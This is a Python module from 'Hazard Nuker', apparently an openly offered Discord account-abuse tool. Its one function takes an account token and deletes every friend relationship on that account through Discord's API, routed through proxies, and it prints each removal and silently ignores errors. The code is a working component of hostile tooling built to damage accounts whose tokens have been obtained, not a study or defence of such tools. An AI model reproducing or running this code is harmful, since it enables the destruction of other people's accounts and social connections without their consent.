# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests

from colorama import Fore

from util.plugins.common import getheaders, proxy

def UnFriender(token, friends):
    for friend in friends:
        try:
            #Delete all friends they have
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies=proxy(), headers=getheaders(token))
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")